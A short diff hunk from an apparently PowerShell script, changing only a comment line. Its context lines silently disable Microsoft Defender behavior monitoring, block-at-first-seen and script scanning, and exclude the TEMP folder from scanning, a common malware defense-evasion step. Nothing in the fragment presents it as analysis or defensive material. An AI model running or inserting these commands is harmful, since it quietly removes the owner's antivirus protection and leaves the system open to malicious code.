@@ -10,4 +10,4 @@ Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
-#
+#crazy
